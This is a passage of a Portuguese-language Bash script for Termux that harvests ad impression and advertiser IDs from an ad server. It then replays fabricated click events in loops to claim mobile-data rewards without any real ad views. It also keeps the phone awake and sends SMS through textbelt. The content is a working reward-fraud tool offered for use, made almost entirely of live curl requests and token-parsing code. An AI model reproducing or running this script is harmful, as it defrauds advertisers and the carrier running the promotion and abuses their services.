sleep 0.02
done

sleep 4
echo -e "${NADA}"
Menu5;;
*) ;;
esac




ikcolb=$(echo "$NumeroDeTelefone")
case $ikcolb in
$e$e$i$b$i$i$d$d$b$i$z$f$h)exit;;
*);;
esac


echo -e "2" >> TestadorIndividual.txt
TestarIndivi=$(cat TestadorIndividual.txt | grep -c "$NumeroDeTelefone")
case $TestarIndivi in
0)rm -f TestadorIndividual.txt;;

*)
clear
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
echo -e "${BANNER}"

gucci="QUER CONTINUAR A TESTAGEM INDIVIDUAL? [Y/n]"

opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.03
done

read -n1 conectadoain
case $conectadoain in
n)rm -f TestadorIndividual.txt;;
N)rm -f TestadorIndividual.txt;;
*)AccessPass=$(cat ChavePass.txt)
QualquerNome="TestadorIndividual"
rm -f advname.txt
rm -f advreward.txt
rm -f advid.txt
rm -f impressionid.txt
GerarOsTokens;;
esac
;;
esac


NADA='\033[0m'
CINZA='\e[02;37m'
DESTACAR='\e[01;37m'
SCOLOR='\033[0m'
echo
rm -f ChavePass.txt
rm -f TokensEncontrados.txt
rm -f ReinicioAltomatico.txt
rm -f ConversionEvent.txt
rm -f advmensagem.txt
rm -f advreward.txt
rm -f advrewardcriar.txt
rm -f advnamecriar.txt
rm -f advname.txt
rm -f TestesFeitos.txt
rm -f tokencreator.txt
rm -f impressionid.txt
rm -f tokencreator2.txt
rm -f advid.txt
rm -f advidcriar.txt
rm -f impressionid.txt
rm -f impressionidcriar.txt
rm -f TestadorIndividual.txt
clear
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
echo -e "${BANNER}"

gucci="PROCURANDO TOKENS"

opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.03
done

echo -ne "."
sleep 0.5

X9deToken=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A%22100%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22102%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22103%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22104%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22105%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22106%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22107%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22108%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22109%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22110%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22111%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22112%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22113%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22114%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22115%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22116%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22117%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22118%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22119%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22120%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22121%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22122%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22123%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22124%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%5D&pageId=660224&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2F$UrlReferer%2F&accessPass=$AccessPass" $UrlAds -H "Origin: $UrlOrigin")

X9Oi=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A301%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Dmanaus%3BtailtState%3Damazonas%3BtailCountry%3Dbr%22%7D%5D&pageId=822068&insertionId=&insertionUUID=&insertionType=ANY&referer=&accessPass=$AccessPass" -H "Origin: $UrlOrigin" $UrlAds)

echo -ne "."
sleep 1

echo -e "$X9deToken" >> tokencreator.txt
echo -e "$X9Oi" >> tokencreator.txt



advid=$(cat tokencreator.txt | grep -a -i -o advid..............| cut -d':' -f2 | cut -d'"' -f1)
echo -e "$advid" >> advidcriar.txt

impressionid=$(cat tokencreator.txt | grep -a -i -o impressionEventId......................................... | cut -d'"' -f3)
echo -e "$impressionid" >> impressionidcriar.txt

advname=$(cat tokencreator.txt | grep -o advName.............................................................................................. | cut -d '"' -f3-4)

echo -e "$advname" >> advnamecriar.txt

advreward=$(cat tokencreator.txt | grep -o rewardWebMessage2........................................................................................ | cut -d'"' -f1-3 | cut -d'.' -f1 | cut -d',' -f1 | cut -d'"' -f2-3)

echo -e "$advreward" >> advrewardcriar.txt

advmensagem=$(cat tokencreator.txt | grep -o headlineWebmessage1......................................................................... | cut -d'"' -f2-3 | cut -d'<' -f1 | cut -d'"' -f2 | cut -d'.' -f1)

echo -e "$advmensagem" >> advmensagem.txt

echo -ne "."
sleep 0.8

NewTokensRev
}



GerarOsTokens(){


a1dvid=$(cat advidcriar.txt | grep -n , | cut -d':' -f2)
echo -e "$a1dvid" >> advid.txt

i1mpressionid=$(cat impressionidcriar.txt | grep -n - | cut -d':' -f2)
echo -e "$i1mpressionid" >> impressionid.txt

a1dvname=$(cat advnamecriar.txt | grep -n '"' | cut -d':' -f2 | cut -d'"' -f1)
echo -e "$a1dvname" >> advname.txt

a1dvreward=$(cat advrewardcriar.txt | grep -n ':' | cut -d '"' -f2 | cut -d'>' -f2 | cut -d'<' -f1)
echo -e "$a1dvreward" >> advreward.txt


$QualquerNome
}

Mensagem11(){
echo
Mensagem12
}

Mensagem12(){
rm -f TokenVez.txt


AZULALL='\e[01;37;44m'
VermelhoAll='\e[01;37;41m'

echo -e "${VermelhoAll}       TESTAGEM INICIADA        ${NADA}"
Testador
}




Testador(){

termux-wake-lock

echo -e "1" >> TokenVez.txt
LimiteAds=$(cat advid.txt | wc -l)

TokenVez=$(cat TokenVez.txt | grep -c "1")

AdvIDTest=$(cat advid.txt | tr -d ',' | sed -n "$TokenVez"p)

ImpressionTest=$(cat impressionid.txt | sed -n "$TokenVez"p)

AdvNameTest=$(cat advname.txt | sed -n "$TokenVez"p)

AdvRewardTest=$(cat advreward.txt | sed -n "$TokenVez"p)

AdvMensagemTest=$(cat advmensagem.txt | sed -n "$TokenVez"p)


TesterElegibility=$(echo "$ImpressionTest" | grep -n - | grep -c 1:)

case $TesterElegibility in
1) ;;
*)Ler11;;
esac


BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
echo -e "${LETRAPRETA}           TESTADOR $TokenVez           ${NADA}"

gucci="ADV NAME: $AdvNameTest"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${YELLOW}${gucci:$b:1}${NADA}" 
sleep 0.0001
done
echo


gucci="ADV MENSAGEM: $AdvMensagemTest"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${YELLOW}${gucci:$b:1}${NADA}" 
sleep 0.0001
done
echo

rewardcheck=$(echo "$AdvRewardTest" | grep -c "ganhou")
case $rewardcheck in
0)rick="ADV REWARD: Sem Mensagem";;
*)rick="ADV REWARD: $AdvRewardTest"
esac

gucci="$rick"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${YELLOW}${gucci:$b:1}${NADA}" 
sleep 0.0001
done
echo

gucci="IMPRESSION EVENT ID: $ImpressionTest"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${YELLOW}${gucci:$b:1}${NADA}" 
sleep 0.0001
done
echo


gucci="ADV ID: $AdvIDTest"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${YELLOW}${gucci:$b:1}${NADA}" 
sleep 0.0001
done
echo



for i in $(seq $Repet1r);
do

reward1=$(curl -s $UrlClick -d "advId=$AdvIDTest&eventImpressionId=$ImpressionTest&apass=$AccessPass")
rw1=$(echo $reward1 | grep -c "evtClickId")
case $rw1 in

0)gucci1="NAO ELEGIVEL NESSE TESTADOR"
gucci=$(echo "$gucci1" | fold -w 1 )
a=$(echo -e "$gucci" | wc -l)
for coint in $(seq $a)
do
b=$(echo -e "$gucci" | sed -n "$coint"p)
echo -ne "${RED}$b"
sleep 0.05
done
sleep 2
echo
echo
Testador;;

1) gucci1="SUCESSO NO ENVIO DOS MBS"
gucci=$(echo "$gucci1" | fold -w 1 )
a=$(echo -e "$gucci" | wc -l)
for coint in $(seq $a)
do
b=$(echo -e "$gucci" | sed -n "$coint"p)
echo -ne "${GREEN}$b" 
sleep 0.05
done
echo -ne " - "
sleep 0.06
echo -ne "$i"
sleep 0.1
echo
;;

esac 
done
echo
echo


LimiteAds2=$(cat TokenVez.txt | wc -l)
case $LimiteAds2 in
$LimiteAds)Ler11;;
*);;
esac
Testador
}


Ler11(){ 
echo -e "1" >> ReinicioAltomatico.txt

ReinicioAutomatico=$(cat ReinicioAltomatico.txt | grep -c 1)
case $ReinicioAutomatico in
1)echo -e "1" >> TestesFeitos.txt
echo -e "${VermelhoAll}            TESTAGEM FINALIZADA             ${NADA}"

gucci="A TESTAGEM SERÁ REINICIADA ALTOMATICAMENTE"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.009
done

echo
echo
echo
Mensagem12;;
*);;
esac


smsnumero=$(echo "$NumeroDeTelefone" | cut -c3-13)

Mensagem1=$(echo $[ 1 + $[ RANDOM % 9  ]])

smsmensagem=$( echo "$Mensagens1" | sed -n "$Mensagem1"p)


SMSenvio=$(curl -s -m 20 -X POST https://textbelt.com/text --data-urlencode phone="+55 $smsnumero" --data-urlencode message="$smsmensagem" -d key=textbelt)



am start -n com.termux/com.termux.app.TermuxActivity > /dev/null 2>&1
sleep 5
echo -e "1" >> TestesFeitos.txt
Ler12
}
Ler12(){
TestesFeitos=$(cat TestesFeitos.txt | wc -l)
clear
echo -e "${VermelhoAll}            TESTAGEM FINALIZADA             ${NADA}"
echo -e "${BANNER}"


gucci="NUMERO DE TELEFONE USADO: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.0001
done

gucci="$NumeroDeTelefone"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${GREEN}${gucci:$b:1}${NADA}" 
sleep 0.07
done
echo



gucci="TESTES FEITOS COM ESSES TOKENS: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.0001
done

gucci="$TestesFeitos"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${GREEN}${gucci:$b:1}${NADA}" 
sleep 0.07
done
echo
echo


gucci="1 - PROCURAR NOVOS TOKENS "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.0001
done

gucci="MELHOR ESPERAR UM POUCO"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.009
done
echo



gucci="2 - REPETIR OS TOKENS USADOS "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.0001
done

gucci="ATÉ PARAR DE CAIR MBS"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.009
done
echo


gucci="0 - VOLTAR "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.0001
done

gucci="MERDA DE CHIP"
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${CINZA}${gucci:$b:1}${NADA}" 
sleep 0.009
done
echo
echo

gucci="ESCOLHA UMA OPÇÃO: "
opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}${NADA}" 
sleep 0.05
done

read denovo1
case $denovo1 in
1)rm -f TestesFeitos.txt ; Buscartokens;;
2)echo; rm -f TokenVez.txt ;Mensagem12 ;rm -f ReinicioAltomatico.txt;;
0)MenuPrincipal;;
*)clear  ; Ler12;;
esac
}





ProcurarMaisTokens(){
rm -f X9NavegueVivo.txt
rm -f advmensagemrev.txt
rm -f advrewardrev.txt
rm -f advnamerev.txt
rm -f ClubeFacilToken.txt
rm -f TokensEncontrados.txt
rm -f impressionidrev.txt
rm -f tokencreatorrev.txt
rm -f tokencreator2rev.txt
rm -f advidrev.txt
clear
BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
echo -e "${BANNER}"

gucci="PROCURANDO NOVOS TOKENS"

opa=$(echo -e "$gucci" | wc -m)
for i in $(seq $opa)
do
b=$(($i-1))
echo -ne "${DESTACAR}${gucci:$b:1}" 
sleep 0.03
done

echo -ne "."
sleep 0.5


X9deToken=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A%22100%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22102%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22103%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22104%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22105%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22106%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22107%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22108%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22109%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22110%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22111%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22112%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22113%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22114%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22115%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22116%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22117%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22118%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22119%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22120%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22121%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22122%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22123%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22124%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%5D&pageId=660224&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2F$UrlReferer%2F&accessPass=$AccessPass" $UrlAds -H "Origin: $UrlOrigin")

X9Oi=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A301%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Dmanaus%3BtailtState%3Damazonas%3BtailCountry%3Dbr%22%7D%5D&pageId=822068&insertionId=&insertionUUID=&insertionType=ANY&referer=&accessPass=$AccessPass" -H "Origin: $UrlOrigin" $UrlAds)


echo -e "$X9deToken" >> tokencreatorrev.txt
echo -e "$X9Oi" >> tokencreatorrev.txt

echo -ne "."
sleep 0.5
CriandoOsTokens1
}

CriandoOsTokens1(){
rm -f TokensEncontrados.txt

advid=$(cat tokencreatorrev.txt | grep -a -i -o advid..............| cut -d':' -f2 | cut -d'"' -f1)
echo -e "$advid" >> advidrev.txt

impressionid=$(cat tokencreatorrev.txt | grep -a -i -o impressionEventId......................................... | cut -d'"' -f3)
echo -e "$impressionid" >> impressionidrev.txt

advname=$(cat tokencreatorrev.txt | grep -o advName.............................................................................................. | cut -d '"' -f3-4)

echo -e "$advname" >> advnamerev.txt

advreward=$(cat tokencreatorrev.txt | grep -o rewardWebMessage2........................................................................................ | cut -d'"' -f1-3 | cut -d'.' -f1 | cut -d',' -f1)

echo -e "$advreward" >> advrewardrev.txt

advmensagem=$(cat tokencreatorrev.txt | grep -o headlineWebmessage1......................................................................... | cut -d'"' -f2-3)

echo -e "$advmensagem" >> advmensagemrev.txt

advmensagem001=$(cat advmensagemrev.txt | grep -n '"' | grep "1:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
advmensagem002=$(cat advmensagemrev.txt | grep -n '"' | grep "2:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
advmensagem003=$(cat advmensagemrev.txt | grep -n '"' | grep "3:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
advmensagem004=$(cat advmensagemrev.txt | grep -n '"' | grep "4:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
advmensagem005=$(cat advmensagemrev.txt | grep -n '"' | grep "5:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
advmensagem006=$(cat advmensagemrev.txt | grep -n '"' | grep "6:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
advmensagem007=$(cat advmensagemrev.txt | grep -n '"' | grep "7:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
advmensagem008=$(cat advmensagemrev.txt | grep -n '"' | grep "8:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
advmensagem009=$(cat advmensagemrev.txt | grep -n '"' | grep "9:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
advmensagem0010=$(cat advmensagemrev.txt | grep -n '"' | grep "10:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )


advreward001=$(cat advrewardrev.txt | grep -n ':' | grep "1:" | cut -d'"' -f2-3)
advreward002=$(cat advrewardrev.txt | grep -n ':' | grep "2:" | cut -d'"' -f2-3)
advreward003=$(cat advrewardrev.txt | grep -n ':' | grep "3:" | cut -d'"' -f2-3)
advreward004=$(cat advrewardrev.txt | grep -n ':' | grep "4:" | cut -d'"' -f2-3)
advreward005=$(cat advrewardrev.txt | grep -n ':' | grep "5:" | cut -d'"' -f2-3)
advreward006=$(cat advrewardrev.txt | grep -n ':' | grep "6:" | cut -d'"' -f2-3)
advreward007=$(cat advrewardrev.txt | grep -n ':' | grep "7:" | cut -d'"' -f2-3)
advreward008=$(cat advrewardrev.txt | grep -n ':' | grep "8:" | cut -d'"' -f2-3)
advreward009=$(cat advrewardrev.txt | grep -n ':' | grep "9:" | cut -d'"' -f2-3)
advreward0010=$(cat advrewardrev.txt | grep -n ':' | grep "10:" | cut -d'"' -f2-3)


advname001=$(cat advnamerev.txt | grep -n '"' | grep "1:" | cut -d':' -f2)
advname002=$(cat advnamerev.txt | grep -n '"' | grep "2:" | cut -d':' -f2)
advname003=$(cat advnamerev.txt | grep -n '"' | grep "3:" | cut -d':' -f2)
advname004=$(cat advnamerev.txt | grep -n '"' | grep "4:" | cut -d':' -f2)
advname005=$(cat advnamerev.txt | grep -n '"' | grep "5:" | cut -d':' -f2)
advname006=$(cat advnamerev.txt | grep -n '"' | grep "6:" | cut -d':' -f2)
advname007=$(cat advnamerev.txt | grep -n '"' | grep "7:" | cut -d':' -f2)
advname008=$(cat advnamerev.txt | grep -n '"' | grep "8:" | cut -d':' -f2)
advname009=$(cat advnamerev.txt | grep -n '"' | grep "9:" | cut -d':' -f2)
advname0010=$(cat advnamerev.txt | grep -n '"' | grep "10:" | cut -d':' -f2)



impressionid001=$(cat impressionidrev.txt | grep -n - | grep 1: | cut -d':' -f2)
impressionid002=$(cat impressionidrev.txt | grep -n - | grep 2: | cut -d':' -f2)
impressionid003=$(cat impressionidrev.txt | grep -n - | grep 3: | cut -d':' -f2)
impressionid004=$(cat impressionidrev.txt | grep -n - | grep 4: | cut -d':' -f2)
impressionid005=$(cat impressionidrev.txt | grep -n - | grep 5: | cut -d':' -f2)
impressionid006=$(cat impressionidrev.txt | grep -n - | grep 6: | cut -d':' -f2)
impressionid007=$(cat impressionidrev.txt | grep -n - | grep 7: | cut -d':' -f2)
impressionid008=$(cat impressionidrev.txt | grep -n - | grep 8: | cut -d':' -f2)
impressionid009=$(cat impressionidrev.txt | grep -n - | grep 9: | cut -d':' -f2)
impressionid0010=$(cat impressionidrev.txt | grep -n - | grep 10: | cut -d':' -f2)



advid001=$(cat advidrev.txt | grep -n , | grep 1: | cut -d':' -f2)
advid002=$(cat advidrev.txt | grep -n , | grep 2: | cut -d':' -f2 )
advid003=$(cat advidrev.txt | grep -n , | grep 3: | cut -d':' -f2 )
advid004=$(cat advidrev.txt | grep -n , | grep 4: | cut -d':' -f2 )
advid005=$(cat advidrev.txt | grep -n , | grep 5: | cut -d':' -f2 )
advid006=$(cat advidrev.txt | grep -n , | grep 6: | cut -d':' -f2 )
advid007=$(cat advidrev.txt | grep -n , | grep 7: | cut -d':' -f2 )
advid008=$(cat advidrev.txt | grep -n , | grep 8: | cut -d':' -f2 )
advid009=$(cat advidrev.txt | grep -n , | grep 9: | cut -d':' -f2 )
advid0010=$(cat advidrev.txt | grep -n , | grep 10: | cut -d':' -f2 )

visa="NOVO "
visa2="NOVOS "
echo -ne "."
sleep 0.5

aiy=$(echo "$advid001" | grep -c ,)
case $aiy in
1);;
0)NewTokensRev;;
esac

test001=$(cat advidcriar.txt | grep -n , | grep -c "$advid001")
case $test001 in
1) ;;
0) echo -e "$advid001" >> advidcriar.txt ; echo -e "$impressionid001" >> impressionidcriar.txt ; echo -e "$advname001" >> advnamecriar.txt ;  echo -e "$advreward001" >> advrewardcriar.txt ; echo -e "$advmensagem001" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
esac

